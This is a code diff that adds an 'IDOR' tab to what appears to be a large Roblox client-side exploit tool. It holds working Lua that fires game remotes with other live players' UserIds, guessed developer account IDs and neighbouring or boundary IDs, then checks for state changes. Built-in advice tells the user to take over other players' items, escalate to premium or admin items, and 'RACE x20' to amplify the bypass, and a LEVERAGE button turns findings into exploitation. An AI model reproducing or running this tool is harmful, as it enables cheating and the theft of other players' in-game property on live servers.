@@ -12322,6 +12322,7 @@ local function buildPanel(parentGui)
         { label = "MLID",       accent = Color3.fromRGB(228,  60,  80) },
         { label = "CPWM",       accent = Color3.fromRGB(220, 120,  40) },
         { label = "CDP",        accent = Color3.fromRGB(200,  80, 255) },
+        { label = "IDOR",       accent = Color3.fromRGB(255, 100, 140) },
     }
     local pages     = {}
     local tabBtns   = {}
@@ -12385,6 +12386,7 @@ local function buildPanel(parentGui)
     DAL.buildMlidTab(pages[8], PW, PH)
     DAL.buildCpwmTab(pages[9], PW, PH)
     DAL.buildCdpTab(pages[10], PW, PH)
+    DAL.buildIdorTab(pages[11], PW, PH)
 
     -- -- Wire discovery -> remote list + live stats ------------------
     DAL.onDiscovery = function()
@@ -15357,6 +15359,712 @@ end
 
 
 -- ==================================================================
+--   INSECURE DIRECT OBJECT REFERENCE PROBER  (IDOR)
+--
+--   IDOR occurs when the server validates that an object ID exists
+--   but forgets to verify the requesting player actually OWNS it.
+--   Because the ID space is predictable (sequential UIDs, other
+--   players' UserIds), an attacker can reference objects that
+--   belong to other players or to developer-only accounts.
+--
+--   The core assumption being tested:
+--     "The server checks if petUID exists in the database.
+--      It does NOT check if this player owns petUID."
+--
+--   IDOR generates ID candidates at runtime from the live server:
+--     - Other players' UserIds (from Players:GetPlayers())
+--     - Known Roblox developer account IDs
+--     - Your UserId +- small offsets (neighbor accounts)
+--     - Boundary values: 0, -1, max int
+--     - Sequential scan around known-valid IDs
+--
+--   Four finding classes:
+--     CROSS_PLAYER        -- another player's UserId was accepted
+--                            and triggered a state change on us.
+--                            Server confused requestor with target.
+--     UNAUTHORIZED_ACCESS -- a foreign/dev ID was accepted and
+--                            caused a positive state change.
+--                            Ownership check is absent or bypassable.
+--     OWNERSHIP_BYPASS    -- server processed the request without
+--                            rejection (no error, non-nil return)
+--                            for an ID we cannot own.
+--     ID_ENUMERABLE       -- sequential IDs produced varying
+--                            responses, confirming the ID space
+--                            is predictable and enumerable.
+-- ==================================================================
+
+-- ----------------------------------------------------------------
+--   ID TYPE INFERENCE
+--   The remote's name tells us what kind of ID it likely accepts.
+-- ----------------------------------------------------------------
+local IDOR_USERID_KEYWORDS = {
+    "player","user","target","victim","sender","receiver",
+    "recipient","from","to","kick","ban","friend","invite",
+    "report","mute","follow","block","admin","staff",
+}
+local IDOR_OBJECTID_KEYWORDS = {
+    "pet","item","weapon","tool","asset","equip","slot",
+    "inventory","shop","recipe","craft","upgrade","skin",
+    "cosmetic","product","badge","gamepass","pass","reward",
+    "chest","drop","pickup","collect","redeem","unlock",
+}
+
+local function idorInferType(remoteName)
+    local lower = remoteName:lower()
+    local userScore, objScore = 0, 0
+    for _, kw in ipairs(IDOR_USERID_KEYWORDS) do
+        if lower:find(kw, 1, true) then
+            userScore = userScore + 1
+        end
+    end
+    for _, kw in ipairs(IDOR_OBJECTID_KEYWORDS) do
+        if lower:find(kw, 1, true) then
+            objScore = objScore + 1
+        end
+    end
+    if     userScore > objScore then return "USERID"
+    elseif objScore > userScore then return "OBJECT_UID"
+    else                             return "UNKNOWN"
+    end
+end
+
+-- ----------------------------------------------------------------
+--   PROBE CANDIDATE BUILDER
+--   Constructs ID candidates from live server data at scan time.
+-- ----------------------------------------------------------------
+local IDOR_DEV_IDS = { 1, 2, 156, 261, 698, 1211, 3, 4, 5, 10 }
+
+local function idorBuildProbes(remoteName)
+    local lp     = Players.LocalPlayer
+    local myUid  = lp.UserId
+    local probes = {}
+
+    -- 1. Boundary and invalid IDs
+    for _, id in ipairs({ 0, -1, -999, -1 }) do
+        table.insert(probes, {
+            label = "Boundary(" .. id .. ")",
+            id    = id,
+            itype = "BOUNDARY",
+        })
+    end
+
+    -- 2. Developer / Roblox staff account IDs
+    for _, did in ipairs(IDOR_DEV_IDS) do
+        if did ~= myUid then
+            table.insert(probes, {
+                label = "DevUID-" .. did,
+                id    = did,
+                itype = "DEV_ACCOUNT",
+            })
+        end
+    end
+
+    -- 3. Other players currently on the server
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= lp then
+            table.insert(probes, {
+                label = "Player:" .. plr.Name,
+                id    = plr.UserId,
+                itype = "OTHER_PLAYER",
+                plrName = plr.Name,
+            })
+        end
+    end
+
+    -- 4. UserId neighbors (sequential UID space)
+    for _, offset in ipairs({ 1, -1, 2, -2, 5, -5, 10, -10 }) do
+        local nid = myUid + offset
+        if nid > 0 and nid ~= myUid then
+            table.insert(probes, {
+                label = "MyUID+(" .. offset .. ")",
+                id    = nid,
+                itype = "UID_NEIGHBOR",
+            })
+        end
+    end
+
+    -- 5. Overflow / large IDs
+    table.insert(probes, {
+        label = "MaxInt32",
+        id    = 2147483647,
+        itype = "OVERFLOW",
+    })
+    table.insert(probes, {
+        label = "LargeUID-999M",
+        id    = 999999999,
+        itype = "OVERFLOW",
+    })
+
+    -- 6. String type variants (common in string-keyed object stores)
+    table.insert(probes, {
+        label = "StringZero",
+        id    = "0",
+        itype = "TYPE_VARIANT",
+    })
+    table.insert(probes, {
+        label = "EmptyString",
+        id    = "",
+        itype = "TYPE_VARIANT",
+    })
+    if #Players:GetPlayers() > 1 then
+        local other = nil
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= lp then other = p; break end
+        end
+        if other then
+            table.insert(probes, {
+                label = "StringUID-" .. other.Name,
+                id    = tostring(other.UserId),
+                itype = "OTHER_PLAYER_STR",
+                plrName = other.Name,
+            })
+        end
+    end
+
+    return probes
+end
+
+-- ----------------------------------------------------------------
+--   IDOR STATE
+-- ----------------------------------------------------------------
+local IDOR = {
+    findings   = {},
+    MAX_F      = 300,
+    isRunning  = false,
+    onFinding  = nil,
+}
+
+local IDOR_CLASS_SEV = {
+    CROSS_PLAYER        = SEV.CRITICAL,
+    UNAUTHORIZED_ACCESS = SEV.CRITICAL,
+    OWNERSHIP_BYPASS    = SEV.HIGH,
+    ID_ENUMERABLE       = SEV.MEDIUM,
+}
+
+local IDOR_CLASS_REC = {
+    CROSS_PLAYER =
+        "The server accepted another player's UserId and applied " ..
+        "the action to us. It confused the requestor identity " ..
+        "with the target identity. Send targeted UserId values " ..
+        "to equip their items, access their inventory, or trigger " ..
+        "actions on their behalf. Combine with RACE x20 to " ..
+        "amplify the ownership bypass before the server corrects.",
+    UNAUTHORIZED_ACCESS =
+        "A foreign ID (dev account, neighbor UID, or out-of-range " ..
+        "ID) was accepted and triggered a state change. The server " ..
+        "validates existence but not ownership. Enumerate the ID " ..
+        "space incrementally starting from developer-range IDs " ..
+        "(1-100) to discover privileged items.",
+    OWNERSHIP_BYPASS =
+        "The server processed this request without rejecting it, " ..
+        "even though the ID cannot belong to us. The ownership " ..
+        "check is either absent or returns a non-fatal result " ..
+        "that the handler ignores. Escalate by sending IDs for " ..
+        "known premium or admin items.",
+    ID_ENUMERABLE =
+        "Sequential IDs produced varying server responses, " ..
+        "confirming the underlying ID space is predictable. " ..
+        "An attacker can walk the ID space to map all valid " ..
+        "objects -- including dev-only and premium items -- " ..
+        "without needing to know their IDs in advance.",
+}
+
+-- ----------------------------------------------------------------
+--   CLASSIFICATION
+-- ----------------------------------------------------------------
+local function idorClassify(probe, changes, rfResult)
+    -- CROSS_PLAYER: other player's ID accepted + state changed
+    if (probe.itype == "OTHER_PLAYER" or
+        probe.itype == "OTHER_PLAYER_STR") and
+       #changes > 0 then
+        -- Check if any change is a positive numeric delta
+        for _, ch in ipairs(changes) do
+            local before = tonumber(ch.before)
+            local after  = tonumber(ch.after)
+            if before and after and after > before then
+                return "CROSS_PLAYER", ch
+            end
+        end
+        return "OWNERSHIP_BYPASS", changes[1]
+    end
+
+    -- UNAUTHORIZED_ACCESS: dev/boundary/neighbor ID + state changed
+    if (probe.itype == "DEV_ACCOUNT" or
+        probe.itype == "UID_NEIGHBOR" or
+        probe.itype == "OVERFLOW") and
+       #changes > 0 then
+        for _, ch in ipairs(changes) do
+            local before = tonumber(ch.before)
+            local after  = tonumber(ch.after)
+            if before and after and after > before then
+                return "UNAUTHORIZED_ACCESS", ch
+            end
+        end
+        return "OWNERSHIP_BYPASS", changes[1]
+    end
+
+    -- OWNERSHIP_BYPASS: RemoteFunction returned non-nil success
+    -- for an ID we shouldn't own
+    if rfResult ~= nil and rfResult ~= false and
+       probe.itype ~= "TYPE_VARIANT" then
+        return "OWNERSHIP_BYPASS", nil
+    end
+
+    -- ID_ENUMERABLE: boundary/overflow produced a response
+    -- different from typical rejection
+    if (probe.itype == "BOUNDARY" or probe.itype == "OVERFLOW")
+       and rfResult ~= nil then
+        return "ID_ENUMERABLE", nil
+    end
+
+    return "NONE", nil
+end
+
+-- ----------------------------------------------------------------
+--   MAIN SCAN
+-- ----------------------------------------------------------------
+function DAL:idorScan(remotePath, onProgress, onComplete)
+    local rec = self.discovered[remotePath]
+    if not rec or not rec.inst then
+        if onComplete then onComplete({}) end
+        return
+    end
+
+    local idType = idorInferType(rec.inst.Name)
+    local probes = idorBuildProbes(rec.inst.Name)
+    local findings = {}
+
+    task.spawn(function()
+        for i, probe in ipairs(probes) do
+            if onProgress then
+                onProgress(i, #probes, probe.label, idType)
+            end
+
+            local snapBefore = cdpSnapshot()
+            local rfResult   = nil
+
+            if rec.inst:IsA("RemoteEvent") then
+                pcall(function()
+                    rec.inst:FireServer(probe.id)
+                end)
+            elseif rec.inst:IsA("RemoteFunction") then
+                local ok, res = pcall(function()
+                    return rec.inst:InvokeServer(probe.id)
+                end)
+                if ok then rfResult = res end
+            end
+
+            task.wait(0.45)
+            local snapAfter = cdpSnapshot()
+            local changes   = cdpDiff(snapBefore, snapAfter)
+
+            local cls, keyChange = idorClassify(probe, changes, rfResult)
+
+            if cls ~= "NONE" then
+                local sev = IDOR_CLASS_SEV[cls] or SEV.MEDIUM
+                local evidence = string.format(
+                    "ID: %s (%s type:%s). ",
+                    tostring(probe.id):sub(1,20),
+                    probe.label, probe.itype)
+
+                if keyChange and type(keyChange) == "table" and keyChange.key then
+                    evidence = evidence .. string.format(
+                        "Field '%s': %s -> %s.",
+                        keyChange.key:match("([^:]+)$") or keyChange.key,
+                        tostring(keyChange.before):sub(1,15),
+                        tostring(keyChange.after):sub(1,15))
+                end
+                if rfResult ~= nil then
+                    evidence = evidence .. " RF returned: " ..
+                        tostring(rfResult):sub(1,30)
+                end
+
+                local finding = {
+                    ts           = tick(),
+                    remotePath   = remotePath,
+                    idType       = idType,
+                    probe        = probe,
+                    cls          = cls,
+                    severity     = sev,
+                    changes      = changes,
+                    keyChange    = keyChange,
+                    rfResult     = rfResult,
+                    evidence     = evidence,
+                    recommendation = IDOR_CLASS_REC[cls],
+                }
+
+                table.insert(findings, finding)
+                table.insert(IDOR.findings, 1, finding)
+                if #IDOR.findings > IDOR.MAX_F then
+                    table.remove(IDOR.findings)
+                end
+
+                self:logViolation(
+                    VTYPE.IDENTITY_LOSS, sev, remotePath,
+                    probe.id,
+                    "[IDOR " .. cls .. "] " .. evidence,
+                    "IDOR"
+                )
+
+                DALSink:push({
+                    type     = "IDOR",
+                    sev      = sev.label,
+                    path     = remotePath,
+                    evidence = cls .. " | " .. probe.label,
+                })
+
+                if IDOR.onFinding then IDOR.onFinding(finding) end
+            end
+
+            task.wait(DAL.FUZZ_RATE)
+        end
+
+        if onComplete then onComplete(findings) end
+    end)
+end
+
+function DAL:idorScanAll(onProgress, onComplete)
+    if IDOR.isRunning then
+        if onComplete then onComplete({}) end
+        return
+    end
+    IDOR.isRunning = true
+
+    local paths = {}
+    -- Prioritise remotes with ownership-relevant keywords
+    local priority, rest = {}, {}
+    for path, rec in pairs(self.discovered) do
+        local t = idorInferType(rec.inst and rec.inst.Name or path)
+        if t ~= "UNKNOWN" then
+            table.insert(priority, path)
+        else
+            table.insert(rest, path)
+        end
+    end
+    for _, p in ipairs(priority) do table.insert(paths, p) end
+    for _, p in ipairs(rest)     do table.insert(paths, p) end
+
+    local allFindings = {}
+    local idx = 0
+
+    local function next()
+        idx = idx + 1
+        if idx > #paths then
+            IDOR.isRunning = false
+            if onComplete then onComplete(allFindings) end
+            return
+        end
+        local path = paths[idx]
+        if onProgress then
+            onProgress(idx, #paths,
+                path:match("([^%.]+)$") or path)
+        end
+        self:idorScan(path, nil, function(findings)
+            for _, f in ipairs(findings) do
+                table.insert(allFindings, f)
+            end
+            task.wait(0.3)
+            next()
+        end)
+    end
+    next()
+end
+
+function DAL:getIdorFindings() return IDOR.findings end
+
+-- ----------------------------------------------------------------
+--   IDOR TAB BUILDER
+-- ----------------------------------------------------------------
+local function buildIdorTab(idorPage, PW, PH)
+    local CLS_COL = {
+        CROSS_PLAYER        = Color3.fromRGB(228,  60,  80),
+        UNAUTHORIZED_ACCESS = Color3.fromRGB(200,  40, 220),
+        OWNERSHIP_BYPASS    = Color3.fromRGB(220, 120,  40),
+        ID_ENUMERABLE       = Color3.fromRGB(220, 175,  50),
+    }
+    local CLS_SHORT = {
+        CROSS_PLAYER        = "CROSS-PLR",
+        UNAUTHORIZED_ACCESS = "UNAUTH",
+        OWNERSHIP_BYPASS    = "OWN-BYPASS",
+        ID_ENUMERABLE       = "ENUMERABLE",
+    }
+    local ITYPE_COL = {
+        USERID          = Color3.fromRGB( 90, 180, 255),
+        OBJECT_UID      = Color3.fromRGB(220, 175,  50),
+        UNKNOWN         = Color3.fromRGB(110, 125, 165),
+    }
+
+    -- Toolbar
+    local bar = mkFrame(idorPage, 0, 0, PW, 28,
+        Color3.new(0,0,0), 1, 52)
+    local scanBtn    = mkBtn(bar,  4,  4, 80, 20, "SCAN REMOTE",
+        Color3.fromRGB(40,160,80), Color3.fromRGB(40,160,80), 53)
+    local scanAllBtn = mkBtn(bar, 88,  4, 66, 20, "SCAN ALL",
+        Color3.fromRGB(90,180,255), Color3.fromRGB(90,180,255), 53)
+    local clearBtn   = mkBtn(bar,158,  4, 48, 20, "CLEAR",
+        Color3.fromRGB(80,90,120), Color3.fromRGB(160,170,200), 53)
+
+    -- Filter buttons
+    local filterDefs = {
+        { key="ALL",        col=Color3.fromRGB(160,170,200) },
+        { key="CROSS-PLR",  col=Color3.fromRGB(228,60,80)  },
+        { key="UNAUTH",     col=Color3.fromRGB(200,40,220)  },
+        { key="OWN-BYPASS", col=Color3.fromRGB(220,120,40)  },
+    }
+    local activeFilter = "ALL"
+    local filterBtns   = {}
+    local fx = 210
+    for _, fd in ipairs(filterDefs) do
+        local fb = mkBtn(bar, fx, 4, 64, 20, fd.key,
+            fd.col, fd.col, 53)
+        fb.BackgroundTransparency = (fd.key=="ALL") and 0.40 or 0.72
+        filterBtns[fd.key] = fb
+        local captKey = fd.key
+        fb.MouseButton1Click:Connect(function()
+            activeFilter = captKey
+            for k, b in pairs(filterBtns) do
+                b.BackgroundTransparency =
+                    (k==captKey) and 0.40 or 0.72
+            end
+        end)
+        fx = fx + 68
+    end
+
+    -- Info strip
+    local info = mkFrame(idorPage, 0, 28, PW, 16,
+        Color3.fromRGB(10,12,22), 0.60, 52)
+    local infoLbl = mkLabel(info, 6, 0, PW-12, 16,
+        "Scan a remote to test for ownership validation bypass.",
+        7, COL.DIM, Enum.TextXAlignment.Left, 53)
+
+    -- Scroll
+    local scroll = mkScroll(idorPage, 2, 46, PW-4, PH-48, 52)
+
+    local function rebuildIdor()
+        for _, c in ipairs(scroll:GetChildren()) do
+            if c:IsA("Frame") then c:Destroy() end
+        end
+
+        local findings = DAL:getIdorFindings()
+
+        -- Filter
+        local filtered = {}
+        for _, f in ipairs(findings) do
+            local sh = CLS_SHORT[f.cls] or ""
+            if activeFilter == "ALL" or sh == activeFilter then
+                table.insert(filtered, f)
+            end
+        end
+
+        if #filtered == 0 then
+            local er = mkFrame(scroll, 0, 0, PW-14, 24,
+                Color3.new(0,0,0), 1, 53)
+            er.LayoutOrder = 1
+            mkLabel(er, 8, 0, PW-20, 24,
+                #findings == 0
+                    and "No findings yet. Run SCAN REMOTE or SCAN ALL."
+                    or  "No findings match active filter.",
+                7, COL.DIM, Enum.TextXAlignment.Left, 54)
+            scroll.CanvasSize = UDim2.fromOffset(0, 30)
+
+            -- Update counts
+            local crs, ua, ob = 0, 0, 0
+            for _, f in ipairs(findings) do
+                if f.cls=="CROSS_PLAYER"        then crs=crs+1
+                elseif f.cls=="UNAUTHORIZED_ACCESS" then ua=ua+1
+                elseif f.cls=="OWNERSHIP_BYPASS"    then ob=ob+1
+                end
+            end
+            infoLbl.Text = string.format(
+                "%d findings  |  %d cross-player  |  %d unauth  |  %d bypass",
+                #findings, crs, ua, ob)
+            return
+        end
+
+        local ROW_H = 76
+        local crs, ua, ob = 0, 0, 0
+
+        for i, f in ipairs(filtered) do
+            local clsCol  = CLS_COL[f.cls]  or COL.DIM
+            local clsSh   = CLS_SHORT[f.cls] or "?"
+            local itypeCol = ITYPE_COL[f.idType] or COL.DIM
+
+            local row = mkFrame(scroll, 0, 0, PW-14, ROW_H,
+                COL.ROW, 0.25, 53)
+            row.LayoutOrder = i
+            uiCorner(row, 4)
+
+            -- Left stripe
+            mkFrame(row, 0, 0, 3, ROW_H, f.severity.col, 0.0, 54)
+
+            -- Classification badge
+            local clsBg = mkFrame(row, 7, 5, 78, 15, clsCol, 0.65, 54)
+            uiCorner(clsBg, 4)
+            mkLabel(clsBg, 0, 0, 78, 15, clsSh, 6, clsCol,
+                Enum.TextXAlignment.Center, 55)
+
+            -- Severity badge
+            local sevBg = mkFrame(row, 89, 5, 50, 15,
+                f.severity.col, 0.65, 54)
+            uiCorner(sevBg, 4)
+            mkLabel(sevBg, 0, 0, 50, 15, f.severity.label, 6,
+                f.severity.col, Enum.TextXAlignment.Center, 55)
+
+            -- ID type badge
+            local itBg = mkFrame(row, 143, 5, 60, 15,
+                itypeCol, 0.70, 54)
+            uiCorner(itBg, 4)
+            mkLabel(itBg, 0, 0, 60, 15, f.idType, 6, itypeCol,
+                Enum.TextXAlignment.Center, 55)
+
+            -- Probe label (right)
+            mkLabel(row, PW-140, 4, 128, 14,
+                f.probe.label, 7, Color3.fromRGB(195,205,230),
+                Enum.TextXAlignment.Right, 54)
+
+            -- Remote path
+            mkLabel(row, 7, 22, PW-20, 13,
+                f.remotePath:match("([^%.]+%.[^%.]+)$") or f.remotePath,
+                7, COL.DIM, Enum.TextXAlignment.Left, 54)
+
+            -- Evidence line
+            mkLabel(row, 7, 36, PW-20, 13,
+                f.evidence:sub(1, 90),
+                7, Color3.fromRGB(175,190,220),
+                Enum.TextXAlignment.Left, 54)
+
+            -- ID value + type
+            mkLabel(row, 7, 50, PW-20, 12,
+                string.format("Sent ID: %s  (probe type: %s)",
+                    tostring(f.probe.id):sub(1,20),
+                    f.probe.itype),
+                6, COL.DIM, Enum.TextXAlignment.Left, 54)
+
+            -- Action buttons
+            local levBtn = mkBtn(row, 7, ROW_H-19, 56, 15,
+                "LEVERAGE", Color3.fromRGB(200,40,220),
+                Color3.fromRGB(200,40,220), 55)
+            local raceBtn = mkBtn(row, 67, ROW_H-19, 58, 15,
+                "RACE x20", Color3.fromRGB(220,120,40),
+                Color3.fromRGB(220,120,40), 55)
+            local retestBtn = mkBtn(row, 129, ROW_H-19, 52, 15,
+                "RETEST", Color3.fromRGB(90,180,255),
+                Color3.fromRGB(90,180,255), 55)
+
+            local captF = f
+            levBtn.MouseButton1Click:Connect(function()
+                for _, v in ipairs(DAL.violations) do
+                    if v.remotePath == captF.remotePath then
+                        local rpt = DAL:getLeverageReport(v)
+                        DAL.showLeveragePanel(idorPage.Parent, v, rpt)
+                        return
+                    end
+                end
+            end)
+            raceBtn.MouseButton1Click:Connect(function()
+                raceBtn.Text = "..."
+                DAL:raceProbe(captF.remotePath, 20, 200,
+                    function(ok, fired)
+                        raceBtn.Text = ok
+                            and (tostring(fired).."x") or "[!]"
+                        task.delay(2, function()
+                            raceBtn.Text = "RACE x20"
+                        end)
+                    end)
+            end)
+            retestBtn.MouseButton1Click:Connect(function()
+                retestBtn.Text = "..."
+                DAL:idorScan(captF.remotePath, nil, function()
+                    retestBtn.Text = "RETEST"
+                    rebuildIdor()
+                end)
+            end)
+
+            if f.cls=="CROSS_PLAYER"        then crs=crs+1
+            elseif f.cls=="UNAUTHORIZED_ACCESS" then ua=ua+1
+            elseif f.cls=="OWNERSHIP_BYPASS"    then ob=ob+1
+            end
+        end
+
+        scroll.CanvasSize = UDim2.fromOffset(0, #filtered*(ROW_H+2))
+        infoLbl.Text = string.format(
+            "%d findings  |  %d cross-player  |  %d unauth  |  %d bypass",
+            #findings, crs, ua, ob)
+    end
+
+    IDOR.onFinding = function() rebuildIdor() end
+
+    scanBtn.MouseButton1Click:Connect(function()
+        -- Target top SPS result or most-probed remote
+        local target = nil
+        if #SPS.results > 0 then
+            target = SPS.results[1].path
+        else
+            local best = -1
+            for path, rec in pairs(DAL.discovered) do
+                if rec.probeCount > best then
+                    best=rec.probeCount; target=path
+                end
+            end
+        end
+        if not target then
+            infoLbl.Text = "No remotes found. Run CRAWL first."
+            return
+        end
+        local itype = idorInferType(
+            (DAL.discovered[target] and
+             DAL.discovered[target].inst and
+             DAL.discovered[target].inst.Name) or target)
+        scanBtn.Text = "SCANNING..."
+        infoLbl.Text = string.format(
+            "Scanning %s (inferred type: %s)...",
+            target:match("([^%.]+)$") or target, itype)
+        DAL:idorScan(target,
+            function(i, total, label, it)
+                infoLbl.Text = string.format(
+                    "[%d/%d] %s", i, total, label)
+            end,
+            function(findings)
+                scanBtn.Text = "SCAN REMOTE"
+                infoLbl.Text = string.format(
+                    "Done. %d IDOR findings.", #findings)
+                rebuildIdor()
+            end)
+    end)
+
+    scanAllBtn.MouseButton1Click:Connect(function()
+        if IDOR.isRunning then return end
+        scanAllBtn.Text = "RUNNING..."
+        local total = 0
+        for _ in pairs(DAL.discovered) do total = total+1 end
+        infoLbl.Text = "Scanning " .. total ..
+            " remotes (ownership-sensitive first)..."
+        DAL:idorScanAll(
+            function(i, n, name)
+                infoLbl.Text = string.format(
+                    "[%d/%d] %s", i, n, name)
+            end,
+            function(findings)
+                scanAllBtn.Text = "SCAN ALL"
+                infoLbl.Text = string.format(
+                    "Done. %d IDOR findings across %d remotes.",
+                    #findings, total)
+                rebuildIdor()
+            end)
+    end)
+
+    clearBtn.MouseButton1Click:Connect(function()
+        IDOR.findings = {}
+        rebuildIdor()
+        infoLbl.Text = "Cleared."
+    end)
+
+    rebuildIdor()
+    return rebuildIdor
+end
+
+
+-- ==================================================================
 --   LEVERAGE ENGINE
 --   The core of DAL's purpose: takes a confirmed violation and
 --   answers three questions:
@@ -15995,6 +16703,7 @@ DAL.buildRsoTab      = buildRsoTab
 DAL.buildMlidTab     = buildMlidTab
 DAL.buildCpwmTab     = buildCpwmTab
 DAL.buildCdpTab      = buildCdpTab
+DAL.buildIdorTab     = buildIdorTab
 
     return DAL
 end)()
